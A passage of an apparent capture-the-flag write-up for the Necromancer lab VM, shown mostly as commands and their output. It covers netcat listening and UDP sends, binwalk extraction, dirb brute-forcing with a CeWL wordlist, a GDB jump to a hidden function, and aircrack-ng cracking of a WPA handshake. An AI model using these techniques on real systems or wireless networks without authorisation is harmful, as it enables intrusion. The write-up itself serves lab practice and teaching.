</span><span class='line'>MAC Address: 00:0C:29:3B:03:B5 (VMware)
</span><span class='line'>Too many fingerprints match this host to give specific OS details
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'>1   0.23 ms 192.168.217.142
</span><span class='line'>
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1336.70 seconds</span></code></pre></td></tr></table></div></figure>


<p>Then I tried an UDP scan, but only got 1 hit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT    STATE SERVICE
</span><span class='line'>666/udp open  doom</span></code></pre></td></tr></table></div></figure>


<p>I tried connecting to it with netcat, but other than a message, I didn&rsquo;t find anything:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnu 192.168.217.142 666
</span><span class='line'>(UNKNOWN) [192.168.217.142] 666 (?) open
</span><span class='line'>
</span><span class='line'>You gasp for air! Time is running out!
</span><span class='line'>
</span><span class='line'>You gasp for air! Time is running out!</span></code></pre></td></tr></table></div></figure>


<h1>Flag #1 &ndash; Sniffing network traffic</h1>

<p>With nothing else to go with, I started sniffing the local traffic and looked if the Necromancer is sending anything across the network:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/necromancer/capture.PNG" title="capture" alt="Wireshark capture"></p>

<p>The machine is trying to establish TCP connections (SYN flag) to different IPs, on port 4444. So what happens if we listen on that port on our attacker machine?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -vnlp 4444
</span><span class='line'>listening on [any] 4444 ...
</span><span class='line'>connect to [192.168.223.129] from (UNKNOWN) [192.168.223.128] 25759
</span><span class='line'>...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...</span></code></pre></td></tr></table></div></figure>


<p>We received a string! I used an online Base64 decoder to decipher this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome!
</span><span class='line'>
</span><span class='line'>You find yourself staring towards the horizon, with nothing but silence surrounding you.
</span><span class='line'>You look east, then south, then west, all you can see is a great wasteland of nothingness.
</span><span class='line'>
</span><span class='line'>Turning to your north you notice a small flicker of light in the distance.
</span><span class='line'>You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.  
</span><span class='line'>
</span><span class='line'>The air around you begins to get thicker, and your heart begins to beat against your chest. 
</span><span class='line'>You turn to your left.. then to your right!  You are trapped!
</span><span class='line'>
</span><span class='line'>You fumble through your pockets.. nothing!  
</span><span class='line'>You look down and see you are standing in sand.  
</span><span class='line'>Dropping to your knees you begin to dig frantically.
</span><span class='line'>
</span><span class='line'>As you dig you notice the barrier extends underground!  
</span><span class='line'>Frantically you keep digging and digging until your nails suddenly catch on an object.
</span><span class='line'>
</span><span class='line'>You dig further and discover a small wooden box.  
</span><span class='line'>flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.
</span><span class='line'>
</span><span class='line'>You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"</span></code></pre></td></tr></table></div></figure>


<p>An MD5 hash..I decoded it and moved on.</p>

<p>Flag #1: <strong>opensesame</strong></p>

<h1>Flag #2 &ndash; Chanting the string</h1>

<p>In the previous message, we have a hint for the 2nd flag. Now we&rsquo;ve decoded the 1st flag, so we need to send it..where? To its doom! Remember the UDP port 666 we discovered earlier:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -vnu 192.168.223.128 666
</span><span class='line'>(UNKNOWN) [192.168.223.128] 666 (?) open
</span><span class='line'>opensesame
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>A loud crack of thunder sounds as you are knocked to your feet!
</span><span class='line'>
</span><span class='line'>Dazed, you start to feel fresh air entering your lungs.
</span><span class='line'>
</span><span class='line'>You are free!
</span><span class='line'>
</span><span class='line'>In front of you written in the sand are the words:
</span><span class='line'>
</span><span class='line'>flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}
</span><span class='line'>
</span><span class='line'>As you stand to your feet you notice that you can no longer see the flicker of light in the distance.
</span><span class='line'>
</span><span class='line'>You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.
</span><span class='line'>
</span><span class='line'>As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.
</span><span class='line'>
</span><span class='line'>The birds get closer, and closer, and closer.
</span><span class='line'>
</span><span class='line'>Staring up at the crows you can see they are in a formation.
</span><span class='line'>
</span><span class='line'>Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.
</span><span class='line'>
</span><span class='line'>As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.
</span><span class='line'>
</span><span class='line'>666 is closed.</span></code></pre></td></tr></table></div></figure>


<p>Another flag, another hash. Flag #2: <strong>1033750779</strong></p>

<h1>Flag #3 &ndash; A pile of feathers</h1>

<p>The hint mentioned the number 80, so I used my browser to navigate to it and ended up in The Chasm.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/necromancer/chasm.png" title="the chasm" alt="The Chasm"></p>

<p>I&rsquo;ve downloaded the image, pileoffeathers.jpg, and ran it through exiftool, with no discoveries. Then I ran strings on it and saw a couple of mentions about a file called <em>feathers.txt</em>. I thought that a text file must be hidden in the image. so I looked for ways to extract it. Kali comes pre-equipped with just the right tool:</p>

<blockquote><p>binwalk  &ndash; tool for searching binary images for embedded files and executable code</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>binwalk -e pileoffeathers.jpg 
</span><span class='line'>
</span><span class='line'>DECIMAL       HEXADECIMAL     DESCRIPTION
</span><span class='line'>--------------------------------------------------------------------------------
</span><span class='line'>0             0x0             JPEG image data, EXIF standard
</span><span class='line'>12            0xC             TIFF image data, little-endian offset of first image directory: 8
</span><span class='line'>270           0x10E           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#"&gt; &lt;rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmlns:xmpMM="http
</span><span class='line'>36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
</span><span class='line'>37267         0x9193          End of Zip archive</span></code></pre></td></tr></table></div></figure>


<p>The files were extracted in a directory called _pileoffeathers.jpg.extracted. Inside I found the feathers.txt file in a ZIP archive called 9082.zip.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat feathers.txt 
</span><span class='line'>ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==</span></code></pre></td></tr></table></div></figure>


<p>Another Base64 string. Decoded it to find the flag and the hint:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at 
</span><span class='line'>/amagicbridgeappearsatthechasm</span></code></pre></td></tr></table></div></figure>


<p>Flag #3: <strong>345465869</strong></p>

<h1>Flag #4 &ndash; Talisman</h1>

<p>On the web server, I went to the path of the above magic bridge, that leads to the cave:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/necromancer/cave.png" title="cave" alt="cave entrance"></p>

<p>Another image, this time it&rsquo;s a magicbook.jpg. But with all the usual tools I&rsquo;ve tried, I couldn&rsquo;t find any hidden information. I went back to the webpage and started bruteforcing for files and directories with different wordlists, and found nothing. Back to the drawing board..the hint is <em>There must be a magical item that could protect you from the necromancer&rsquo;s spell.</em>. After looking on the interwebz for a bit, I went the route of building a custom dictionary of magical items to use with dirb. I used cewl to build a list from the words on <a href="https://dnd5e.info/magic-items/alphabetical-magic-item-list">https://dnd5e.info/magic-items/alphabetical-magic-item-list</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cewl https://dnd5e.info/magic-items/alphabetical-magic-item-list -w magicitems.txt
</span><span class='line'>CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
</span><span class='line'>/usr/lib/ruby/vendor_ruby/spider/spider_instance.rb:125: warning: constant ::Fixnum is deprecated</span></code></pre></td></tr></table></div></figure>


<p>The wordlist has over 9k entries:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wc -l magicitems.txt 
</span><span class='line'>9315 magicitems.txt</span></code></pre></td></tr></table></div></figure>


<p>Back to dirb, and this time it found something!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dirb http://192.168.223.128/amagicbridgeappearsatthechasm/ /root/Downloads/magicitems.txt 
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>DIRB v2.22    
</span><span class='line'>By The Dark Raver
</span><span class='line'>-----------------
</span><span class='line'>
</span><span class='line'>START_TIME: Sat Jun  9 09:08:18 2018
</span><span class='line'>URL_BASE: http://192.168.223.128/amagicbridgeappearsatthechasm/
</span><span class='line'>WORDLIST_FILES: /root/Downloads/magicitems.txt
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>
</span><span class='line'>GENERATED WORDS: 9315                                                          
</span><span class='line'>
</span><span class='line'>---- Scanning URL: http://192.168.223.128/amagicbridgeappearsatthechasm/ ----
</span><span class='line'>+ http://192.168.223.128/amagicbridgeappearsatthechasm/talisman (CODE:200|SIZE:9676)
</span><span class='line'>                                                                               
</span><span class='line'>-----------------
</span><span class='line'>END_TIME: Sat Jun  9 09:08:37 2018
</span><span class='line'>DOWNLOADED: 9315 - FOUND: 1</span></code></pre></td></tr></table></div></figure>


<p>A talisman! Going to the path leads to a binary called talisman. But running it doesn&rsquo;t produce the effect I&rsquo;d hoped:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./talisman 
</span><span class='line'>You have found a talisman.
</span><span class='line'>
</span><span class='line'>The talisman is cold to the touch, and has no words or symbols on it's surface.
</span><span class='line'>
</span><span class='line'>Do you want to wear the talisman?  y
</span><span class='line'>
</span><span class='line'>Nothing happens.</span></code></pre></td></tr></table></div></figure>


<p>I fired up GDB, set a breakpoint on main and ran the executable again.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Breakpoint 1, 0x08048a21 in main ()
</span><span class='line'>(gdb) disassemble
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>   0x08048a13 &lt;+0&gt;: lea    0x4(%esp),%ecx
</span><span class='line'>   0x08048a17 &lt;+4&gt;: and    $0xfffffff0,%esp
</span><span class='line'>   0x08048a1a &lt;+7&gt;: pushl  -0x4(%ecx)
</span><span class='line'>   0x08048a1d &lt;+10&gt;:    push   %ebp
</span><span class='line'>   0x08048a1e &lt;+11&gt;:    mov    %esp,%ebp
</span><span class='line'>   0x08048a20 &lt;+13&gt;:    push   %ecx
</span><span class='line'>=&gt; 0x08048a21 &lt;+14&gt;: sub    $0x4,%esp
</span><span class='line'>   0x08048a24 &lt;+17&gt;:    call   0x8048529 &lt;wearTalisman&gt;
</span><span class='line'>   0x08048a29 &lt;+22&gt;:    mov    $0x0,%eax
</span><span class='line'>   0x08048a2e &lt;+27&gt;:    add    $0x4,%esp
</span><span class='line'>   0x08048a31 &lt;+30&gt;:    pop    %ecx
</span><span class='line'>   0x08048a32 &lt;+31&gt;:    pop    %ebp
</span><span class='line'>   0x08048a33 &lt;+32&gt;:    lea    -0x4(%ecx),%esp
</span><span class='line'>   0x08048a36 &lt;+35&gt;:    ret    </span></code></pre></td></tr></table></div></figure>


<p>There is a wearTalisman function that is about to be called. Must be what we&rsquo;ve seen when running the binary. I set up another breakpoint on this function and disassembled it, but I could see nothing interesting. Then I looked what other functions there might be in the binary:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) info functions
</span><span class='line'>All defined functions:
</span><span class='line'>
</span><span class='line'>Non-debugging symbols:
</span><span class='line'>0x080482d0  _init
</span><span class='line'>0x08048310  printf@plt
</span><span class='line'>0x08048320  __libc_start_main@plt
</span><span class='line'>0x08048330  __isoc99_scanf@plt
</span><span class='line'>0x08048350  _start
</span><span class='line'>0x08048380  __x86.get_pc_thunk.bx
</span><span class='line'>0x08048390  deregister_tm_clones
</span><span class='line'>0x080483c0  register_tm_clones
</span><span class='line'>0x08048400  __do_global_dtors_aux
</span><span class='line'>0x08048420  frame_dummy
</span><span class='line'>0x0804844b  unhide
</span><span class='line'>0x0804849d  hide
</span><span class='line'>0x080484f4  myPrintf
</span><span class='line'>0x08048529  wearTalisman
</span><span class='line'>0x08048a13  main
</span><span class='line'>0x08048a37  chantToBreakSpell
</span><span class='line'>0x08049530  __libc_csu_init
</span><span class='line'>0x08049590  __libc_csu_fini
</span><span class='line'>0x08049594  _fini
</span><span class='line'>0xf7fd6a30  _dl_catch_exception@plt</span></code></pre></td></tr></table></div></figure>


<p>A function named chantToBreakSpell sounds exactly like what we need! And it wasn&rsquo;t called from main or wearTalisman. So I jumped directly to it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) jump chantToBreakSpell
</span><span class='line'>Continuing at 0x8048a3b.
</span><span class='line'>!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
</span><span class='line'>You fall to your knees.. weak and weary.
</span><span class='line'>Looking up you can see the spell is still protecting the cave entrance.
</span><span class='line'>The talisman is now almost too hot to touch!
</span><span class='line'>Turning it over you see words now etched into the surface:
</span><span class='line'>flag4{ea50536158db50247e110a6c89fcf3d3}
</span><span class='line'>Chant these words at u31337
</span><span class='line'>!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
</span><span class='line'>[Inferior 1 (process 3652) exited with code 0102]</span></code></pre></td></tr></table></div></figure>


<p>The talisman worked! Flag #4: <strong>blackmagic</strong></p>

<h1>Flag #5 &ndash; Black magic</h1>

<p>Like before, I&rsquo;ve tried sending the string, this time to UDP 31337, but:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnu 192.168.223.128 31337
</span><span class='line'>(UNKNOWN) [192.168.223.128] 31337 (?) open
</span><span class='line'>bNothing happens.
</span><span class='line'>lNothing happens.
</span><span class='line'>aNothing happens.
</span><span class='line'>cNothing happens.
</span><span class='line'>kNothing happens.
</span><span class='line'>mNothing happens.
</span><span class='line'>aNothing happens.
</span><span class='line'>gNothing happens.
</span><span class='line'>iNothing happens.
</span><span class='line'>cNothing happens.</span></code></pre></td></tr></table></div></figure>


<p>So I tried a different method of sending the string by piping it to netcat and it worked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo blackmagic | nc -u 192.168.223.128 31337
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>As you chant the words, a hissing sound echoes from the ice walls.
</span><span class='line'>
</span><span class='line'>The blue aura disappears from the cave entrance.
</span><span class='line'>
</span><span class='line'>You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.
</span><span class='line'>
</span><span class='line'>You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.
</span><span class='line'>
</span><span class='line'>The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.
</span><span class='line'>
</span><span class='line'>Suddenly, you are attacked by a swarm of bats!
</span><span class='line'>
</span><span class='line'>You aimlessly thrash at the air in front of you!
</span><span class='line'>
</span><span class='line'>The bats continue their relentless attack, until.... silence.
</span><span class='line'>
</span><span class='line'>Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.
</span><span class='line'>
</span><span class='line'>Looking towards one of the torches, you see something on the cave wall.
</span><span class='line'>
</span><span class='line'>You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.
</span><span class='line'>
</span><span class='line'>/thenecromancerwillabsorbyoursoul
</span><span class='line'>
</span><span class='line'>flag5{0766c36577af58e15545f099a3b15e60}</span></code></pre></td></tr></table></div></figure>


<p>Flag #5: <strong>809472671</strong></p>

<h1>Flag #6 &ndash; Necromancer</h1>

<p>Went to the new path and found the necromancer and a flag!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/necromancer/necromancer-fullpage.png" title="necromancer" alt="necromancer"></p>

<p>Flag #6: <strong>1756462165</strong></p>

<h1>Flag #7 &ndash; Not your average SNMP walk</h1>

<p>The necromancer link points to another binary, but when I tried to run it I got an error:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./necromancer 
</span><span class='line'>bash: ./necromancer: cannot execute binary file: Exec format error</span></code></pre></td></tr></table></div></figure>


<p>This file is not an executable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file necromancer
</span><span class='line'>necromancer: bzip2 compressed data, block size = 900k</span></code></pre></td></tr></table></div></figure>


<p>From it I&rsquo;ve extracted a packet capture file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tar xjvf necromancer
</span><span class='line'>necromancer.cap</span></code></pre></td></tr></table></div></figure>


<p>The file contains wireless traffic and references an SSID called community. It also captured deauthentication and association packets. If it captured a WPA handshake, we can try to crack it with aircrack-ng!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>aircrack-ng necromancer.cap -w /usr/share/wordlists/rockyou.txt 
</span><span class='line'>Opening necromancer.cap
</span><span class='line'>Read 2197 packets.
</span><span class='line'>
</span><span class='line'>   #  BSSID              ESSID                     Encryption
</span><span class='line'>
</span><span class='line'>   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)
</span><span class='line'>
</span><span class='line'>Choosing first network as target.
</span><span class='line'>
</span><span class='line'>Opening necromancer.cap
</span><span class='line'>Reading packets, please wait...
</span><span class='line'>
</span><span class='line'>                                 Aircrack-ng 1.2 
</span><span class='line'>
</span><span class='line'>      [00:00:13] 16084/9822768 keys tested (1369.50 k/s) 
</span><span class='line'>
</span><span class='line'>      Time left: 1 hour, 59 minutes, 23 seconds                  0.16%
</span><span class='line'>
</span><span class='line'>                           KEY FOUND! [ death2all ]
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>      Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC 
</span><span class='line'>                       DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7 
</span><span class='line'>
</span><span class='line'>      Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C 
</span><span class='line'>                       56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3 
</span><span class='line'>                       C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92 
</span><span class='line'>                       3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D 
</span><span class='line'>
